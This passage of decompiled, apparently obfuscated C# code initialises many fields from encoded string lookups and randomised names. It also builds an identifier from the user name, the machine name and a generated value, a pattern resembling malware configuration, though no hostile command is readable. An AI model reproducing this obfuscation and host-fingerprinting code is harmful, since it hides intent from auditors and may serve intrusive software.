			PbsdnvfpwWRvGCs(getString_0(107407638)),
			PbsdnvfpwWRvGCs(getString_0(107407605)),
			PbsdnvfpwWRvGCs(getString_0(107407596)),
			PbsdnvfpwWRvGCs(getString_0(107407563)),
			PbsdnvfpwWRvGCs(getString_0(107407490)),
			PbsdnvfpwWRvGCs(getString_0(107407961)),
			PbsdnvfpwWRvGCs(getString_0(107407928)),
			PbsdnvfpwWRvGCs(getString_0(107407919)),
			PbsdnvfpwWRvGCs(getString_0(107407886)),
			PbsdnvfpwWRvGCs(getString_0(107408184)),
			PbsdnvfpwWRvGCs(getString_0(107407845)),
			PbsdnvfpwWRvGCs(getString_0(107407772)),
			PbsdnvfpwWRvGCs(getString_0(107407759)),
			PbsdnvfpwWRvGCs(getString_0(107407214)),
			PbsdnvfpwWRvGCs(getString_0(107407173)),
			PbsdnvfpwWRvGCs(getString_0(107407100)),
			PbsdnvfpwWRvGCs(getString_0(107407067)),
			PbsdnvfpwWRvGCs(getString_0(107407058)),
			PbsdnvfpwWRvGCs(getString_0(107407017)),
			PbsdnvfpwWRvGCs(getString_0(107408151)),
			PbsdnvfpwWRvGCs(getString_0(107407456)),
			PbsdnvfpwWRvGCs(getString_0(107408138)),
			PbsdnvfpwWRvGCs(getString_0(107407423)),
			PbsdnvfpwWRvGCs(getString_0(107407390)),
			PbsdnvfpwWRvGCs(getString_0(107407349)),
			PbsdnvfpwWRvGCs(getString_0(107407316)),
			PbsdnvfpwWRvGCs(getString_0(107407307)),
			PbsdnvfpwWRvGCs(getString_0(107407234)),
			PbsdnvfpwWRvGCs(getString_0(107406689)),
			PbsdnvfpwWRvGCs(getString_0(107406656)),
			PbsdnvfpwWRvGCs(getString_0(107406615)),
			PbsdnvfpwWRvGCs(getString_0(107406606)),
			PbsdnvfpwWRvGCs(getString_0(107406565))
		};
		OKgBAQeRHSlym = new List<string>
		{
			PbsdnvfpwWRvGCs(TfBMtOaYnyXfeqqRN(getString_0(107406492))),
			PbsdnvfpwWRvGCs(TfBMtOaYnyXfeqqRN(getString_0(107406475))),
			PbsdnvfpwWRvGCs(TfBMtOaYnyXfeqqRN(getString_0(107406894))),
			PbsdnvfpwWRvGCs(TfBMtOaYnyXfeqqRN(getString_0(107406797))),
			PbsdnvfpwWRvGCs(TfBMtOaYnyXfeqqRN(getString_0(107406192))),
			PbsdnvfpwWRvGCs(TfBMtOaYnyXfeqqRN(getString_0(107406095))),
			PbsdnvfpwWRvGCs(TfBMtOaYnyXfeqqRN(getString_0(107406002))),
			PbsdnvfpwWRvGCs(getString_0(107406417)),
			PbsdnvfpwWRvGCs(TfBMtOaYnyXfeqqRN(getString_0(107406292))),
			PbsdnvfpwWRvGCs(getString_0(107406195)),
			PbsdnvfpwWRvGCs(getString_0(107405590)),
			PbsdnvfpwWRvGCs(getString_0(107405493)),
			PbsdnvfpwWRvGCs(getString_0(107405912)),
			PbsdnvfpwWRvGCs(TfBMtOaYnyXfeqqRN(getString_0(107406492)))
		};
		edpjkmWiBB = PbsdnvfpwWRvGCs(getString_0(107405815));
		pmzwKqsyDlmmF = new List<string>
		{
			PbsdnvfpwWRvGCs(getString_0(107405734)),
			PbsdnvfpwWRvGCs(getString_0(107405028)),
			PbsdnvfpwWRvGCs(getString_0(107405314)),
			PbsdnvfpwWRvGCs(getString_0(107404608)),
			PbsdnvfpwWRvGCs(getString_0(107404414)),
			PbsdnvfpwWRvGCs(getString_0(107404732))
		};
		soEYuRQrgwk = new List<string>
		{
			PbsdnvfpwWRvGCs(getString_0(107404026)),
			PbsdnvfpwWRvGCs(getString_0(107403965)),
			PbsdnvfpwWRvGCs(getString_0(107403904))
		};
		aYqzBWQifeA = getString_0(107396615);
		KvaSlDHIXTUnK = getString_0(107396615);
		GgwzZdkgUSWq = new DateTime(2000, 1, 1);
		uXNZJauCoqTzJG = new DateTime(2100, 1, 1);
		QOKbVStgyeVL = getString_0(107396791);
		UawyhGBHBLgS = getString_0(107386810);
		SSLjTeVGTsW = getString_0(107396615);
		fNMfifGmoXya = getString_0(107396615);
		rPQFiVwCriY = getString_0(107396615);
		yrIyoHrzWDCT = getString_0(107396791);
		NwrSvcEHBCxFfoz = getString_0(107396615);
		DXDIUZMazYGZy = getString_0(107396615);
		YoPwmbBPpdD = new List<string>
		{
			getString_0(107395363),
			getString_0(107395589),
			getString_0(107395397),
			getString_0(107395470)
		};
		HFFrRFIpQgjXI = getString_0(107396615);
		PZYHNDUWTf = getString_0(107404387);
		MSbkqSPZNmrgShe = getString_0(107396615);
		xEVAdQHTwaeaG = getString_0(107396615);
		twJOYPWqzdD = getString_0(107396615);
		fKcZCslCfAJPz = string.Empty;
		KWarveAlrUeLj = getString_0(107396615);
		CvhuRhPbSX = getString_0(107396791);
		bUDblfHLHXAcgkB = getString_0(107396791);
		vClGBOKLiQn = getString_0(107404350);
		EiyrcFiAoaX = getString_0(107404277);
		TcpbjRHBDJM = getString_0(107396615);
		SbkfEriDLMxWh = getString_0(107396615);
		brYmtXjlZIq = getString_0(107396615);
		NMKbJRePeNuLz = getString_0(107396615);
		OIjqWZRpNdE = getString_0(107396615);
		YwXcfYcDlzL = getString_0(107389535);
		cBZuqZfyygLLC = getString_0(107396615);
		XoculucrhuBC = getString_0(107396615);
		RoiBxbbYOpTnzdF = getString_0(107402947);
		lMZoDXXDrlQgS = getString_0(107396615);
		tBZYVYiWJKaS = getString_0(107396615);
		cuUuUUMpmxH = getString_0(107396615);
		NnZoLXRmVCvIOhK = getString_0(107396615);
		nmjDhIwEGnMOrO = getString_0(107402930);
		aYrdlpstiAwAZTu = getString_0(107396791);
		nqNdPWHffReq = getString_0(107396791);
		FIKBEEWFPHteV = getString_0(107396615);
		EYUcFTYiTRnwV = getString_0(107396615);
		YacSoacXjaCUC = new string[0];
		QtTrkEhpkGUJgMO = getString_0(107396791);
		uBIPmjbCjNt = true;
		VVNvuJuOCGKqN = getString_0(107396791);
		PAOJgADrbjEa = true;
		hxCcwpobkJC = false;
		FRIhZgoxuuhF = false;
		ZaxDTmLwAHHZwVkZ = false;
		dtHHyJMWMTcTg = getString_0(107402917);
		CCDyMIHlAe = false;
		clhLaJHTBGOiPN = false;
		XdhdhAwnktmq = false;
		FRObTCxcUY = false;
		UOlZmEwYRBbnfmvt = true;
		muQSQoYNOwJp = getString_0(107402896) + Environment.UserName + getString_0(107402883) + Environment.MachineName + getString_0(107403374) + yWTIBbUKdpiy.RuDYtoNcCxI() + getString_0(107403369);
		fgLeGcGjPkpRXH = true;
		lBGXxmsJjqv = new Stopwatch();
		LVKhJcfUHGhpJNXz = 0;
		qXIAEocyZgLqByS = 0;
		YazilaoopZ = false;
		tltXBlUAjNeRsFxCp = getString_0(107403328) + yWTIBbUKdpiy.RuDYtoNcCxI() + getString_0(107403319);
		caYhozbaifo = new string[1] { getString_0(107403346) };
		KlnqoelvmWHjj = new List<string>();
		GCkorullzoFEFAMeg = 0;
		RaNDyCdUClri = true;
		UzsRVBPOjcbvM = false;
		CoyMCdqKPDBfCk = false;
		LoAUTpZIRmiA = false;
		AngOozHSWJQ = false;
	}
}
